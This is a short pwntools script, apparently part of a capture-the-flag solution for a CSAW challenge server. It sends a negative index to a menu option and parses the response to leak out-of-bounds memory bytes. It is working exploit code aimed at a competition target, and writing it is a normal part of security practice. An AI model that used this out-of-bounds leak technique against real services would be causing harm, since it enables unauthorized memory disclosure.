from pwn import *

def maybe_hex(x):
    if x is None:
        return '??'
    else:
        return f'{x:02x}'

def list_try_map(f, l):
    result = []
    for x in l:
        try:
            result.append(f(x))
        except Exception:
            pass
    return result

HOST = 'pwn.red.csaw.io'
PORT = 5010

s = remote(HOST, PORT)    
    

def get_chunk(num):
    s.sendall(b'2\n')
    s.recv(1024)
    s.sendall(str(num).encode() + b'\n')
    data = s.recv(1024)
    subdata = data.split(b'-----------------------------')[2]
    i = subdata.rfind(b'\nStrength:')
    namedata = [x for x in subdata[len(b'\nName:         '):i]]
    namedata += [None] * (16 - len(namedata))
    subsubdata = subdata[i:]
    otherdata = [x % 256 for x in list_try_map(int, subsubdata.split())]
    otherdata2 = otherdata[0:6] + list(divmod(otherdata[6], 256)) # might need reversed(list(...))
    combineddata = namedata + otherdata2
    
    return combineddata

print(get_chunk(-4)[-8:])

